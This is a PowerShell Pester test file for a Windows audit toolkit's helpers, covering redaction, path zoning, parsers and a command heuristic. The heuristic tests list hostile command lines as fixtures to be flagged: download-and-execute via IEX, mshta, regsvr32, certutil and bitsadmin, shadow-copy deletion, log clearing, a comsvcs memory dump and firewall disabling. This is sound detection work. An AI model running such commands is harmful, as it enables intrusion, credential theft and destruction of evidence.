# Unit tests for the shared helpers and the heuristics (benign and malicious indicators).

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelper.ps1')
    . (Join-Path $script:RepoRoot 'windows\lib\Common.ps1')
    foreach ($f in 'Get-SystemAudit', 'Get-UserAudit', 'Get-ProcessAudit', 'Get-NetworkAudit', 'Get-ServiceAudit', 'Get-ScheduledTaskAudit', 'Get-AutorunAudit', 'Get-FirewallAudit', 'Get-SecurityConfigAudit', 'Get-FilesystemAudit') {
        . (Join-Path $script:RepoRoot "windows\audit\$f.ps1")
    }
    . (Join-Path $script:RepoRoot 'windows\persistence\Get-PersistenceAudit.ps1')
}

Describe 'Protect-BoText' {
    It 'redacts credentials in command lines' -ForEach @(
        @{ Text = 'tool.exe --password hunter2 --verbose'; Secret = 'hunter2' }
        @{ Text = 'tool.exe -Password=hunter2'; Secret = 'hunter2' }
        @{ Text = 'net use \\srv\share /user:corp\bob S3cretPass'; Secret = 'S3cretPass' }
        @{ Text = 'app.exe /token:abcd1234abcd'; Secret = 'abcd1234abcd' }
        @{ Text = 'curl -H "Authorization: Bearer abc123"'; Secret = 'abc123' }
    ) {
        Protect-BoText $Text | Should -Not -Match $Secret
    }

    It 'summarizes encoded PowerShell payloads instead of printing them' {
        $t = Protect-BoText 'powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA'
        $t | Should -Match '<base64 \d+ chars>'
        $t | Should -Not -Match 'SQBFAFgA'
    }

    It 'replaces non-ASCII characters and truncates long text' {
        Protect-BoText ("caf" + [char]0x00E9) | Should -Be 'caf?'
        (Protect-BoText ('a' * 600) 100).Length | Should -Be 103
    }
}

Describe 'Get-BoCommandReason' {
    It 'flags attacker tradecraft as strong' -ForEach @(
        @{ Cmd = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' }
        @{ Cmd = 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://x/a'')"' }
        @{ Cmd = 'mshta.exe http://203.0.113.9/a.hta' }
        @{ Cmd = 'regsvr32 /s /n /u /i:http://203.0.113.9/a.sct scrobj.dll' }
        @{ Cmd = 'certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe' }
        @{ Cmd = 'bitsadmin /transfer j /download /priority high http://x/a.exe C:\a.exe' }
        @{ Cmd = 'wscript.exe C:\Users\bob\AppData\Local\Temp\x.vbs' }
        @{ Cmd = 'net user helper P@ss123 /add' }
        @{ Cmd = 'vssadmin delete shadows /all /quiet' }
        @{ Cmd = 'wevtutil cl Security' }
        @{ Cmd = 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\t.dmp full' }
        @{ Cmd = 'netsh advfirewall set allprofiles state off' }
    ) {
        (Get-BoCommandReason $Cmd).Strong.Count | Should -BeGreaterThan 0
    }

    It 'does not flag routine administration and vendor commands' -ForEach @(
        @{ Cmd = 'C:\Windows\system32\svchost.exe -k netsvcs -p' }
        @{ Cmd = '"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua /installsource scheduler' }
        @{ Cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Program Files\Contoso Backup\nightly.ps1"' }
        @{ Cmd = '"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background' }
        @{ Cmd = 'schtasks /query /fo csv' }
        @{ Cmd = 'cmd.exe /c dir C:\' }
        @{ Cmd = 'C:\Windows\system32\usoclient.exe StartScan' }
        @{ Cmd = 'powershell.exe -Command "Get-Service | Where-Object Status -eq Running"' }
    ) {
        (Get-BoCommandReason $Cmd).Strong.Count | Should -Be 0
    }

    It 'treats hidden windows and policy bypass as weak context only' {
        $r = Get-BoCommandReason 'powershell.exe -w hidden -ExecutionPolicy Bypass -File C:\ops\run.ps1'
        $r.Strong.Count | Should -Be 0
        $r.Weak.Count | Should -BeGreaterThan 0
    }
}

Describe 'path classification' {
    It 'classifies locations' -ForEach @(
        @{ Path = 'C:\Windows\System32\cmd.exe'; Zone = 'system' }
        @{ Path = 'C:\Program Files\Contoso\a.exe'; Zone = 'programfiles' }
        @{ Path = 'C:\Program Files (x86)\Google\Update\GoogleUpdate.exe'; Zone = 'programfiles' }
        @{ Path = 'C:\Users\Public\a.exe'; Zone = 'temp' }
        @{ Path = 'C:\Windows\Temp\a.exe'; Zone = 'temp' }
        @{ Path = 'C:\Users\bob\Downloads\a.exe'; Zone = 'temp' }
        @{ Path = 'C:\Users\bob\AppData\Local\Temp\a.exe'; Zone = 'temp' }
        @{ Path = 'C:\Users\bob\AppData\Roaming\x\a.exe'; Zone = 'appdata' }
        @{ Path = 'C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe'; Zone = 'appdata-known' }
        @{ Path = 'C:\Users\bob\AppData\Local\Programs\Microsoft VS Code\Code.exe'; Zone = 'appdata-known' }
        @{ Path = 'C:\ProgramData\Microsoft\Windows Defender\Platform\1\MsMpEng.exe'; Zone = 'programdata-known' }
        @{ Path = 'C:\ProgramData\Evil\a.exe'; Zone = 'programdata' }
        @{ Path = 'C:\ProgramData\chocolatey\helpers\chocolateyScriptRunner.ps1'; Zone = 'programdata-known' }
        @{ Path = '%SystemRoot%\system32\svchost.exe'; Zone = 'system' }
        @{ Path = 'D:\Tools\a.exe'; Zone = 'other' }
    ) {
        Get-BoPathZone $Path | Should -Be $Zone
    }

    It 'extracts the program from quoted, unquoted and variable-prefixed commands' -ForEach @(
        @{ Cmd = '"C:\Program Files\A B\a.exe" -x'; Exe = 'C:\Program Files\A B\a.exe' }
        @{ Cmd = 'C:\Program Files\A B\a.exe -x'; Exe = 'C:\Program Files\A B\a.exe' }
        @{ Cmd = '%windir%\system32\SecurityHealthSystray.exe'; Exe = 'C:\Windows\system32\SecurityHealthSystray.exe' }
        @{ Cmd = '\SystemRoot\System32\smss.exe'; Exe = 'C:\Windows\System32\smss.exe' }
        @{ Cmd = '\??\C:\Windows\Temp\evil.sys'; Exe = 'C:\Windows\Temp\evil.sys' }
        @{ Cmd = 'C:\Program Files (x86)\Google\Update\GoogleUpdate'; Exe = 'C:\Program Files (x86)\Google\Update\GoogleUpdate' }
        @{ Cmd = 'C:\Program Files\A B\tool /s -q'; Exe = 'C:\Program Files\A B\tool' }
    ) {
        Get-BoExecutablePath $Cmd | Should -Be $Exe
    }
}

Describe 'address helpers' {
    It 'recognizes private and loopback addresses' {
        foreach ($a in '10.1.2.3', '192.168.0.9', '172.16.5.5', '172.31.0.1', '127.0.0.1', '::1', 'fe80::1', '169.254.1.1', '0.0.0.0') { Test-BoPrivateAddress $a | Should -BeTrue }
        foreach ($a in '8.8.8.8', '203.0.113.9', '172.32.0.1', '52.96.1.1') { Test-BoPrivateAddress $a | Should -BeFalse }
        Test-BoLoopbackAddress '127.0.0.1' | Should -BeTrue
        Test-BoLoopbackAddress '10.0.0.1' | Should -BeFalse
    }
}

Describe 'parsers' {
    It 'parses firewall rule strings' {
        $r = ConvertFrom-BoFirewallRule 'v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=3389|App=C:\x.exe|Name=@FirewallAPI.dll,-28775|'
        $r['Action'] | Should -Be 'Allow'
        $r['Profile'] | Should -Be 'Domain,Private'
        $r['LPort'] | Should -Be '3389'
        $r['App'] | Should -Be 'C:\x.exe'
    }

    It 'parses net accounts output positionally' {
        $t = "Force user logoff how long after time expires?:  Never`nMinimum password age (days): 1`nMaximum password age (days): 42`nMinimum password length: 14`nLength of password history maintained: 24`nLockout threshold: 5`nLockout duration (minutes): 30`nLockout observation window (minutes): 30`nComputer role: SERVER`n"
        $p = ConvertFrom-BoNetAccount -Text $t
        $p.MinLength | Should -Be 14
        $p.LockoutThreshold | Should -Be 5
        ConvertFrom-BoNetAccount -Text 'garbage' | Should -BeNullOrEmpty
    }

    It 'parses netstat -ano output including IPv6 and localized states' {
        $t = "  TCP    0.0.0.0:135     0.0.0.0:0      ABHOEREN   700`n  TCP    10.0.0.5:5000   1.2.3.4:443    HERGESTELLT 1500`n  TCP    [::]:445        [::]:0         LISTENING  4`n  UDP    0.0.0.0:5353    *:*                       700`n"
        $r = ConvertFrom-BoNetstat -Text $t
        @($r.Tcp | Where-Object { $_.State -eq 'Listen' }).Count | Should -Be 2
        @($r.Tcp | Where-Object { $_.State -eq 'Established' }).Count | Should -Be 1
        $r.Udp[0].LocalPort | Should -Be 5353
    }
}

Describe 'registry fixture provider' {
    It 'derives subkeys from nested fixture paths and is case-insensitive' {
        $fx = Copy-BoTestFixture
        try {
            $env:BO_FIXTURE_DIR = $fx
            $script:BoRegFixture = $null
            $k = Get-BoRegKey -Path 'Registry::HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\image file execution options'
            $k.SubKeys | Should -Contain 'sethc.exe'
            (Get-BoRegKey -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Nope') | Should -BeNullOrEmpty
        }
        finally { Remove-Item Env:\BO_FIXTURE_DIR -ErrorAction SilentlyContinue; $script:BoRegFixture = $null; Remove-BoTestFixture $fx }
    }
}
